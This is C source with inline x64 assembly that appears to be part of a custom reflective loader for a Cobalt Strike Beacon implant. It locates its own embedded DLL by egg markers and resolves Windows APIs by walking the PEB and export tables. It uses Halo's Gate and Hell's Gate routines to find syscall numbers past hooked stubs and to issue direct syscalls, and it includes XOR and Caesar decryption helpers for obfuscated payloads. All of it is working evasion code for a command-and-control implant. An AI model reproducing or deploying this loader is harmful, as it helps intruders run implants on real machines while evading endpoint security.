SIZE_T CharStringToWCharString( PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed )
{
    INT Length = (INT)MaximumAllowed;

    while (--Length >= 0)
    {
        if ( ! ( *Destination++ = *Source++ ) )
            return MaximumAllowed - Length - 1;
    }

    return MaximumAllowed - Length;
}

PVOID WINAPI RtlSecureZeroMemory(PVOID ptr,SIZE_T cnt){
  volatile char *vptr = (volatile char *)ptr;
  __stosb ((PBYTE)((DWORD64)vptr),0,cnt);
  return ptr;
}

void xorc(unsigned __int64 length, unsigned char * buff, unsigned char maskkey) {
  int i;
  for (i = 0; i < length; ++i)
  {
    buff[i] ^= maskkey;
  }
}

__asm__(
// "Registers RAX, RCX, RDX, R8, R9, R10, and R11 are considered volatile and must be considered destroyed on function calls."
// "RBX, RBP, RDI, RSI, R12, R14, R14, and R15 must be saved in any function using them." 
// -- https://www.intel.com/content/dam/develop/external/us/en/documents/introduction-to-x64-assembly-181178.pdf
"getPEB: \n" 
    "mov rax, gs:[0x60] \n"         // ProcessEnvironmentBlock // GS = TEB
    "ret \n"

"returnRDI: \n"
    "mov rax, rdi \n"   // RDI is non-volatile. Raw Beacon Base Address will be returned 
    "ret \n"

"getRip: \n"
    "mov rax, [rsp] \n"             // get the return address
    "ret \n"

"getRdllBase: \n" // RAX, RBX, RCX
    "push rbx \n"
    "xor rbx, rbx \n"
    "mov ebx, 0xB0C0ACDC \n"        // egg
"dec: \n"
    "dec rcx \n"
    "cmp ebx, [rcx] \n"             // check for egg
    "jne dec \n"
    "mov rax, rcx \n"               // copy the position pointer
    "sub rax, 0x4 \n"               // check for second egg. If it's not there then its an error
    "cmp ebx, [rax] \n"             // check for egg
    "jne dec \n"
    "sub rax, 0x50 \n"              // Return the base address of our reflective DLL
    "pop rbx \n"
    "ret \n"                        // return initRdllAddr

"getDllBase: \n" // RAX, R8, RCX, RDX, RSI, r9, R10, R11
    "push rcx \n"                   // save our string arg on the top of the stack
   "call StringLengthA \n"          // RAX will be the strlen
    "sub rax, 0x4 \n"               // subtract 4 from our string. Truncates the ".dll" or ".exe"
    "mov r10, rax \n"               // save strlen in the r10 reg
    "pop rcx \n"                    // get our string arg from the top of the stack
    "mov r8, 0 \n"                  // Clear
    "mov r9, 0 \n"                  // Clear 
    "mov r8, gs:[0x60] \n"          // ProcessEnvironmentBlock // GS = TEB
    "mov r8, [r8+0x18] \n"          // _PEB_LDR_DATA
    "mov r8, [r8+0x20] \n"          // InMemoryOrderModuleList - First Entry (probably the host PE File)
    "mov r11, r8 \n"                // save so we know the end of the modList
  "crawl: \n" // RDX RCX R10
    "mov rdx, [r8+0x50] \n"         // BaseDllName Buffer - AKA Unicode string for module in InMemoryOrderModuleList
    "push rcx \n"                   // save our string arg on the top of the stack
    "mov rax, r10 \n"               // reset our string counter
   "call cmpDllStr \n"              // see if our strings match
    "pop rcx \n"                    // remove string arg from the top of the stack
    "test rax, rax \n"              // is cmpDllStr match?
   "je successGetDllBase \n"
    "mov r8, [r8] \n"               // InMemoryOrderLinks Next Entry
    "cmp r11, [r8] \n"              // Are we back at the same entry in the list?
   "je failGetDllBase \n"           // if we went through all modules in modList then return 0 to caller of getDllBase 
   "jmp crawl \n"
      "cmpDllStr: \n"
          "push r8 \n"              // Save register and fix before exiting cmpDllStr()
          "mov r8, 0 \n"            // Clear
        "cmpDllStr_loop: \n"
          "mov r8b, [rcx] \n"       // move the byte in string that we pass as an arg to getDllBase() into the lowest byte of the RSI register
          "mov r9b, [rdx] \n"       // move the byte in string from the InMemList into the lowest byte of the RDI register
          "or r8b, 0x20 \n"         // convert to lowercase if uppercase
          "or r9b, 0x20 \n"         // convert to lowercase if uppercase
          "cmp r9b, r8b \n"         // cmp character byte in the strings
         "jne failcmpDllStr \n"     // if no match then return to the caller of cmpDllStr
          "dec rax \n"              // decrement the counter
          "test rax, rax \n"        // is counter zero?
         "je matchStr \n"           // if we matched the string 
          "add rdx, 0x2 \n"         // move the unicode string to the next byte and skip the 0x00
          "inc rcx \n"              // move our string to the next char
         "jmp cmpDllStr_loop \n"    // compare the next string byte
            "failcmpDllStr: \n"
              "mov rax, 0xFFFF \n"  // return 0xFFFF
              "jmp exitCmpDllStr \n"
            "matchStr: \n"
              "xor rax, rax \n"     // return 0x0 
        "exitCmpDllStr: \n"
          "pop r8 \n"           // restore the r8 register
          "ret \n"
  "failGetDllBase: \n"
    "xor rax, rax \n"           // return 0x0 
    "jmp end \n"
  "successGetDllBase: \n"
    "mov rax, [r8+0x20] \n"         // DllBase Address in process memory
  "end: \n"
    "ret \n"                        // return to caller

"getExportDirectory: \n"
    "push rbx \n" // save the rbx register to the stack
    "mov r8, rcx \n"
    "mov ebx, [rcx+0x3C] \n"
    "add rbx, r8 \n"
    "xor rax, rax \n"
    "mov eax, [rbx+0x88] \n"
    "add rax, r8 \n"
    "pop rbx \n" // restore rbx from stack
    "ret \n" // return ExportDirectory;

"getExportDirectorySize: \n"
    "push rbx \n"
    "mov r8, rcx \n"
    "mov ebx, [rcx+0x3C] \n"
    "add rbx, r8 \n"
    "xor rax, rax \n"
    "mov eax, [rbx+0x8c] \n"
    "pop rbx \n"
    "ret \n" // return ExportDirectory Size;

"getExportAddressTable: \n"
    "xor rax, rax \n"
    "add rdx, 0x1C \n"              // unsigned long AddressOfFunctions; // 0x1C offset // RDX = &RVAExportAddressTable
    "mov eax, [rdx] \n"             // RVAExportAddressTable (Value/RVA)
    "add rax, rcx \n"               // VA ExportAddressTable (The address of the Export table in running memory of the process)
    "ret \n" // return ExportAddressTable

"getExportNameTable: \n"
    "xor rax, rax \n"
    "add rdx, 0x20 \n"              // unsigned long AddressOfFunctions; // 0x20 offset
    "mov eax, [rdx] \n"             // RVAExportAddressOfNames (Value/RVA)
    "add rax, rcx \n"               // VA ExportAddressOfNames
    "ret \n" // return ExportNameTable;

"getExportOrdinalTable: \n"
    "xor rax, rax \n"
    "add rdx, 0x24 \n"              // unsigned long AddressOfNameOrdinals; // 0x24 offset
    "mov eax, [rdx] \n"             // RVAExportAddressOfNameOrdinals (Value/RVA)
    "add rax, rcx \n"               // VA ExportAddressOfNameOrdinals
    "ret \n" // return ExportOrdinalTable;

"getNumberOfNames: \n"
    "xor rax, rax \n"
    "mov eax, [rcx+0x18] \n"
    "ret \n"

// void *   getSymbolAddress(void * symbolStr, unsigned long StrSize, void * dllBase, void * AddressTable, void * NameTable, void * OrdinalTable, unsigned int NumberOfNames);
//                                 RCX                   RDX                R8               r9                [rsp+0x28]         [rsp+0x30]               [rsp+0x38]
"getSymbolAddress: \n" // RAX,RCX,RDI,RSI,R8,R9,R10,R11
    "mov r10, [rsp+0x28] \n"        // ExportNameTable
    "mov r11, [rsp+0x30] \n"        // ExportOrdinalTable
    "xor rax, rax \n"               // Clear upper bits in RAX
    "mov eax, [rsp+0x38] \n"        // NumberOfNames
    "dec rax \n"                    // --NumberOfNames
    "xchg rcx, rdx \n"              // symbolStringSize & RDX =symbolString
    "push rdi \n"                   // Save RDI value and restore at end of function
    "push rsi \n"                   // Save RSI value and restore at end of function
    "push rcx \n"                   // push str len to stack
"lFindSym: \n"
    "mov rcx, [rsp] \n"             // unsigned long symbolStringSize (Reset string length counter for each loop)
    "xor rdi, rdi \n"               // Clear RDI for setting up string name retrieval
    "mov edi, [r10+rax*4] \n"       // RVA NameString = [&NamePointerTable + (Counter * 4)]
    "add rdi, r8 \n"                // &NameString    = RVA NameString + &module.dll
    "mov rsi, rdx \n"               // Address of API Name String to match on the Stack (reset to start of string)
    "repe cmpsb \n"                 // Compare strings at RDI & RSI
    "je FoundSym \n"                // If match then we found the API string. Now we need to find the Address of the API
    "test rax, rax \n"
    "je NotFoundSym \n"             // If we check every exported function, return NULL
    "dec rax \n"                    // Decrement to check if the next name matches
    "jmp short lFindSym \n"         // Jump back to start of loop
"FoundSym: \n"
    "pop rcx \n"                    // Remove string length counter from top of stack
    "mov ax, [r11+rax*2] \n"        // [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
    "mov eax, [r9+rax*4] \n"        // RVA API = [&AddressTable + API OrdinalNumber]
    "add rax, r8 \n"                // module.<API> = RVA module.<API> + module.dll BaseAddress
    "sub r11, rax \n"               // See if our symbol address is greater than the OrdinalTable Address. If so its a forwarder to a different API
    "jns ExitGetSysAddr \n"         // If forwarder, result will be negative and Sign Flag is set (SF), jump not sign = jns
    "mov rax, 0x0 \n"               // If forwarder, return 0x0 and exit
    "jmp ExitGetSysAddr \n"         // Exit function, return symbol address in RAX
"NotFoundSym: \n"
    "pop rcx \n"                    // Remove string length counter from top of stack
    "xor rax, rax \n"               // Return 0x0 to the caller if we can't find the symbol in the DLL              
"ExitGetSysAddr: \n"
    "pop rsi \n"                    // Restore RSI
    "pop rdi \n"                    // Restore RDI
    "ret \n"

"getNewExeHeader: \n"
    "xor rax, rax \n"
    "mov eax, [rcx+0x3C] \n"        // Offset NewEXEHeader
    "add rax, rcx \n"               // &module.dll + Offset NewEXEHeader = &NewEXEHeader
    "ret \n" // return NewExeHeader;

"getDllSize: \n"
    "push rbx \n"
    "xor rbx, rbx \n"
    "mov ebx, [rcx+0x50] \n"        // ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.SizeOfImage
    "mov rax, rbx \n"
    "pop rbx \n"
    "ret \n" // return dllSize;

"getDllSizeOfHeaders: \n"
    "push rbx \n"
    "xor rbx, rbx \n"
    "mov ebx, [rcx+0x54] \n"        // ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.SizeOfHeaders
    "mov rax, rbx \n"
    "pop rbx \n"
    "ret \n" // return SizeOfHeaders;

"Memcpy: \n"  // RAX, RBX, RCX, RDX, R8
    "xor r10, r10 \n"
    "test r8, r8 \n"                // check if r8 = 0
    "jne copy1 \n"                  // if r8 == 0, ret
    "ret \n"                        // Return to caller
"copy1: \n"
    "dec r8 \n"                     // Decrement the counter
    "mov r10b, [rdx] \n"              // Load the next byte to write
    "mov [rcx], r10b \n"              // write the byte
    "inc rdx \n"                    // move rdx to next byte of source
    "inc rcx \n"                    // move rcx to next byte of destination
    "test r8, r8 \n"                // check if r8 = 0
    "jne copy1 \n"                  // if r8 != 0, then write next byte via loop
    "ret \n"                        // Return to Memcpy()

"getOptionalHeader: \n" // RAX, RCX
    "add rcx, 0x18 \n"
    "xchg rax, rcx \n"
    "ret \n" // return OptionalHeader

"getSizeOfOptionalHeader: \n" // RAX, RBX, RCX
    "push rbx \n"
    "add rcx, 0x14 \n"              // &FileHeader.SizeOfOptionalHeader
    "xor rbx, rbx \n"
    "mov bx, [rcx] \n"              // Value of FileHeader.SizeOfOptionalHeader
    "xchg rax, rbx \n"
    "pop rbx \n"
    "ret \n"

"add: \n"
    "add rcx, rdx \n"
    "xchg rax, rcx \n"
    "ret \n"

"getNumberOfSections: \n" // RAX, RCX
    "add rcx, 0x6 \n"               // &FileHeader.NumberOfSections
    "xor rax, rax \n"
    "mov ax, [rcx] \n"
    "ret \n"

"getBeaconEntryPoint: \n" // RAX, RCX, RDX
    "add rdx, 0x10 \n"              // OptionalHeader.AddressOfEntryPoint
    "mov eax, [rdx] \n"
    "add rax, rcx \n"               // newRdllAddr.EntryPoint
    "ret \n" // return newRdllAddrEntryPoint

"copyWithDelimiter: \n" // RAX, RBX, RCX, RDX, R8, R9, R10
    "push rbx \n"
    "xor rax, rax \n"               // number of bytes copied
"copyLoop: \n"
    "mov r10, rax \n"
    "sub r10, r8 \n"                // check if we copied enough bytes
    "jns copydone \n"
    "mov bl, [rdx] \n"              // read byte
    "mov [rcx], bl \n"              // write byte
    "inc rdx \n"
    "inc rcx \n"
    "inc rax \n"                    // increment bytes written
    "cmp bl, r9b \n"                // check if we found the delimiter
    "je copydone\n"
    "jmp copyLoop \n"
"copydone: \n"
    "pop rbx \n"
    "ret \n"

"getSyscallNumber: \n" // RAX,RCX,RDX
    "push rcx \n"
    "call findSyscallNumber \n"     // try to read the syscall directly
    "pop rcx \n"
    "test ax, ax \n"
    "jne syscallnothooked \n"
    "mov dx, 0 \n"                 // index = 0
"loopoversyscalls: \n"
    "push rcx \n"
    "push dx \n"
    "call halosGateUp\n"            // try to read the syscall above
    "pop dx \n"
    "pop rcx \n"
    "test ax, ax \n"
    "jne syscallnothookedup \n"
    "push rcx \n"
    "push dx \n"
    "call halosGateDown\n"          // try to read the syscall below
    "pop dx \n"
    "pop rcx \n"
    "test ax, ax \n"
    "jne syscallnothookeddown \n"
    "inc dx \n"                    // increment the index
    "jmp loopoversyscalls \n"
"syscallnothooked: \n"
    "ret \n"
"syscallnothookedup: \n"
    "sub ax, dx \n"
    "ret \n"
"syscallnothookeddown: \n"
    "add ax, dx \n"
    "ret \n"

"findSyscallNumber: \n"  // RAX,RCX,RSI,RDI
    "push rdi \n"
    "push rsi \n"
    "xor rsi, rsi \n"
    "xor rdi, rdi \n"
    "mov rsi, 0x00B8D18B4C \n"
    "mov edi, [rcx] \n"
    "cmp rsi, rdi \n"
    "jne error \n"
    "xor rax,rax \n"
    "mov ax, [rcx+4] \n"
    "jmp exitfsn \n"
"error: \n"
    "xor rax, rax \n"
"exitfsn:"
    "pop rsi \n"
    "pop rdi \n"
    "ret \n"

"halosGateUp: \n" // RAX,RSI,RDI,RDX
    "push rdi \n"
    "push rsi \n"
    "xor rsi, rsi \n"
    "xor rdi, rdi \n"
    "mov rsi, 0x00B8D18B4C \n"
    "xor rax, rax \n"
    "mov al, 0x20 \n"
    "mul dx \n"
    "add rcx, rax \n"
    "mov edi, [rcx] \n"
    "cmp rsi, rdi \n"
    "jne HalosGateFail \n"
    "mov ax, [rcx+4] \n"
    "jmp HalosGateExit \n"

"halosGateDown: \n" // RAX,RSI,RDI,RDX
    "push rdi \n"
    "push rsi \n"
    "xor rsi, rsi \n"
    "xor rdi, rdi \n"
    "mov rsi, 0x00B8D18B4C \n"
    "xor rax, rax \n"
    "mov al, 0x20 \n"
    "mul dx \n"
    "sub rcx, rax \n"
    "mov edi, [rcx] \n"
    "cmp rsi, rdi \n"
    "jne HalosGateFail \n"
    "mov ax, [rcx+4] \n"
"HalosGateFail: \n"
    "xor rax, rax \n" // return 0x0 if fail to find syscall stub bytes
"HalosGateExit: \n"
    "pop rsi \n"
    "pop rdi \n"
    "ret \n"

"HellsGate: \n"  // Loads the Syscall number into the R11 register before calling HellDescent()
    "xor r11, r11 \n"
    "mov r11d, ecx \n"  // Save Syscall Number in R11
    "ret \n"

"HellDescent: \n" // Called directly after HellsGate
    "xor rax, rax \n"
    "mov r10, rcx \n"
    "mov eax, r11d \n"  // Move the Syscall Number into RAX before calling syscall interrupt
    "syscall \n"
    "ret \n"

"getFirstEntry: \n" // RAX, RCX
    "mov rax, gs:[0x60] \n"         // ProcessEnvironmentBlock // GS = TEB
    "mov rax, [rax+0x18] \n"        // _PEB_LDR_DATA
    "mov rax, [rax+0x20] \n"        // InMemoryOrderModuleList - First Entry (probably the host PE File)
    "ret \n"

"getNextEntry: \n"  // RAX, RCX
    "mov rax, [rcx] \n"
    "cmp rdx, [rax] \n"             // Are we back at the same entry in the list?
    "jne notTheLast \n"
    "xor rax, rax \n"
"notTheLast: \n"
    "ret \n"

"getDllBaseFromEntry: \n"  // RAX,RCX
    "mov rax, [rcx+0x20] \n"
    "ret \n"

"basicCaesar_Decrypt:\n" // RAX,RCX,RDX,RSI,RDI
    "push rdi \n"
    "push rsi \n"
    "mov rsi, rdx\n"
    "xor rax, rax\n"
    "add al, r8b\n"
"bcdLoop:\n"
    "sub [rsi], al\n"
    "inc rsi\n"
    "dec cl\n"
    "test cl,cl\n"
    "jnz bcdLoop\n"
    "pop rsi \n"
    "pop rdi \n"
    "ret\n"
);
